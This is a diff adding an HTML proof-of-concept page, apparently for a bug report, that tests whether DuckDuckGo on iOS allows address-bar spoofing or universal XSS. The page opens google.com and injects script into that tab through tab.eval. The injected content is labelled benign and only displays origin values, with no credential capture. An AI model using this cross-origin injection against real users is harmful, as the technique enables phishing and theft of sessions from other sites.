@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
+<body style="font-family:system-ui,Arial,sans-serif;padding:24px">
+<h3>DuckDuckGo iOS spoof/UXSS classifier (benign)</h3>
+<button onclick="run()" style="font-size:16px;padding:10px 16px">RUN</button>
+<pre id="status">...</pre>
+
+<script>
+function run() {
+  var tab = window.open("https://www.google.com/csi", "_blank");
+  if (!tab) { document.getElementById('status').textContent = 'Popup blocked!'; return; }
+
+  setTimeout(function () {
+    try {
+      // Inject a BENIGN diagnostic page into the opened tab. No login form, no
+      // credential capture — just report what origin the content actually runs as.
+      tab.eval(
+        "document.body.style.fontFamily='Arial';" +
+        "document.body.style.padding='24px';" +
+        "document.body.innerHTML =" +
+        "'<h2>Address-bar check (benign PoC)</h2>' +" +
+        "'<p>document.domain = <b>' + document.domain + '</b></p>' +" +
+        "'<p>location.href = <b>' + location.href + '</b></p>' +" +
+        "'<p>window.origin = <b>' + window.origin + '</b></p>' +" +
+        "'<hr><p>Look at the ADDRESS BAR of THIS tab now.</p>' +" +
+        "'<p>If the bar shows <b>google.com</b> but origin above is NOT https://www.google.com = <b>address-bar SPOOF</b>.</p>' +" +
+        "'<p>If origin above IS https://www.google.com = <b>UXSS / SOP bypass</b> (far more severe).</p>';"
+      );
+      document.getElementById('status').textContent =
+        'Injected. Switch to the new tab — note (1) the address bar value and (2) the origin shown.';
+    } catch (e) {
+      document.getElementById('status').textContent = 'Failed: ' + e.message;
+    }
+  }, 800);
+}
+</script>
+</body>
+</html>
